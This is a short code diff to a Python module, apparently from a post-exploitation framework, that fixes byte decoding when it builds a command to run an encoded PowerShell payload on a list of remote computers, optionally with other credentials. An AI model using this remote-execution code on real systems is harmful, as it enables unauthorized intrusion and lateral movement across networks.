@@ -183,7 +183,7 @@ class Module(object):
         computerNames = "\"" + "\",\"".join(self.options['ComputerName']['Value'].split(",")) + "\""
 
         script += " -ComputerName @("+computerNames+")"
-        script += " -ArgumentList \"C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell.exe -enc " + encPayload + "\""
+        script += " -ArgumentList \"C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell.exe -enc " + encPayload.decode('UTF-8') + "\""
 
         # if we're supplying alternate user credentials
         if userName != '':
